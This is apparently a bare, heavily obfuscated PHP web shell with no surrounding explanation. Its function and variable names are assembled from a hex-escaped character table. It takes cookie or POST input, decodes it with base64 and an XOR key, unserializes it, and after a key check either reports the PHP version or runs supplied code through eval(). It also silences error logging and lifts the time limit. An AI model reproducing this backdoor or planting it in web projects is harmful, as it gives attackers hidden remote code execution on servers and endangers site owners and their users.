<?php ${"\x47\x4c\x4fB\x41\x4c\x53"}['d672ab'] = "\x46\x2f\x50\x2c\x29\x2b\xd\x75\x73\x2d\x79\x23\x55\x4a\x25\x67\x6f\x78\x5e\x5b\x57\x22\x9\x45\x5c\x68\x30\x47\x7d\x66\x3a\x48\x40\x34\x54\x31\x72\x69\x24\x7c\x37\x2a\x58\x60\x41\x6a\x2e\x3d\x28\x36\x32\x5f\x65\x39\x64\x53\x27\x3f\x42\x4c\x61\x20\x49\x7a\x6b\xa\x6e\x63\x43\x7b\x4b\x76\x4e\x6c\x70\x3e\x4f\x6d\x38\x77\x44\x71\x21\x52\x51\x5a\x33\x59\x74\x4d\x62\x35\x7e\x26\x56\x5d\x3b\x3c";
$GLOBALS[$GLOBALS['d672ab'][17].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][67]] = $GLOBALS['d672ab'][67].$GLOBALS['d672ab'][25].$GLOBALS['d672ab'][36];
$GLOBALS[$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][53].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][53]] = $GLOBALS['d672ab'][16].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][54];
$GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][53]] = $GLOBALS['d672ab'][8].$GLOBALS['d672ab'][88].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][73].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][66];
$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][50]] = $GLOBALS['d672ab'][37].$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][88];
$GLOBALS[$GLOBALS['d672ab'][63].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][50]] = $GLOBALS['d672ab'][8].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][73].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][63].$GLOBALS['d672ab'][52];
$GLOBALS[$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][35]] = $GLOBALS['d672ab'][74].$GLOBALS['d672ab'][25].$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][71].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][66];
$GLOBALS[$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][49]] = $GLOBALS['d672ab'][7].$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][73].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][63].$GLOBALS['d672ab'][52];
$GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][86].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][52]] = $GLOBALS['d672ab'][90].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][52];
$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][52]] = $GLOBALS['d672ab'][8].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][88].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][88].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][77].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][73].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][77].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][88];
$GLOBALS[$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][49]] = $GLOBALS['d672ab'][77].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][40];
$GLOBALS[$GLOBALS['d672ab'][81].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29]] = $GLOBALS['d672ab'][10].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][86].$GLOBALS['d672ab'][33];
$GLOBALS[$GLOBALS['d672ab'][25].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][40]] = $_POST;
$GLOBALS[$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][50]] = $_COOKIE;
@$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][50]]($GLOBALS['d672ab'][52].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][73].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][15], NULL);
@$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][50]]($GLOBALS['d672ab'][73].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][15].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][36].$GLOBALS['d672ab'][8], 0);
@$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][50]]($GLOBALS['d672ab'][77].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][17].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][17].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][7].$GLOBALS['d672ab'][88].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][51].$GLOBALS['d672ab'][88].$GLOBALS['d672ab'][37].$GLOBALS['d672ab'][77].$GLOBALS['d672ab'][52], 0);
@$GLOBALS[$GLOBALS['d672ab'][66].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][52]](0);

$ya0d2f = NULL;
$t331b2a2c = NULL;

$GLOBALS[$GLOBALS['d672ab'][15].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][50]] = $GLOBALS['d672ab'][29].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][9].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][86].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][9].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][9].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][86].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][9].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][52];
global $g2afe2;

function y0834($ya0d2f, $h47b7c84)
{
    $ac3ac = "";

    for ($x9e6=0; $x9e6<$GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][53]]($ya0d2f);)
    {
        for ($n129ea=0; $n129ea<$GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][53]]($h47b7c84) && $x9e6<$GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][53]]($ya0d2f); $n129ea++, $x9e6++)
        {
            $ac3ac .= $GLOBALS[$GLOBALS['d672ab'][17].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][91].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][67]]($GLOBALS[$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][53].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][53]]($ya0d2f[$x9e6]) ^ $GLOBALS[$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][53].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][53]]($h47b7c84[$n129ea]));
        }
    }

    return $ac3ac;
}

function m5abd7($ya0d2f, $h47b7c84)
{
    global $g2afe2;

    return $GLOBALS[$GLOBALS['d672ab'][81].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29]]($GLOBALS[$GLOBALS['d672ab'][81].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29]]($ya0d2f, $g2afe2), $h47b7c84);
}

foreach ($GLOBALS[$GLOBALS['d672ab'][8].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][50]] as $h47b7c84=>$if5c)
{
    $ya0d2f = $if5c;
    $t331b2a2c = $h47b7c84;
}

if (!$ya0d2f)
{
    foreach ($GLOBALS[$GLOBALS['d672ab'][25].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][40]] as $h47b7c84=>$if5c)
    {
        $ya0d2f = $if5c;
        $t331b2a2c = $h47b7c84;
    }
}

$ya0d2f = @$GLOBALS[$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][49]]($GLOBALS[$GLOBALS['d672ab'][16].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][49]]($GLOBALS[$GLOBALS['d672ab'][74].$GLOBALS['d672ab'][33].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][49].$GLOBALS['d672ab'][86].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][52]]($ya0d2f), $t331b2a2c));
if (isset($ya0d2f[$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][64]]) && $g2afe2==$ya0d2f[$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][64]])
{
    if ($ya0d2f[$GLOBALS['d672ab'][60]] == $GLOBALS['d672ab'][37])
    {
        $x9e6 = Array(
            $GLOBALS['d672ab'][74].$GLOBALS['d672ab'][71] => @$GLOBALS[$GLOBALS['d672ab'][67].$GLOBALS['d672ab'][60].$GLOBALS['d672ab'][29].$GLOBALS['d672ab'][35].$GLOBALS['d672ab'][54].$GLOBALS['d672ab'][40].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][35]](),
            $GLOBALS['d672ab'][8].$GLOBALS['d672ab'][71] => $GLOBALS['d672ab'][35].$GLOBALS['d672ab'][46].$GLOBALS['d672ab'][26].$GLOBALS['d672ab'][9].$GLOBALS['d672ab'][35],
        );
        echo @$GLOBALS[$GLOBALS['d672ab'][63].$GLOBALS['d672ab'][90].$GLOBALS['d672ab'][52].$GLOBALS['d672ab'][50].$GLOBALS['d672ab'][78].$GLOBALS['d672ab'][50]]($x9e6);
    }
    elseif ($ya0d2f[$GLOBALS['d672ab'][60]] == $GLOBALS['d672ab'][52])
    {
        eval($ya0d2f[$GLOBALS['d672ab'][54]]);
    }
    exit();
}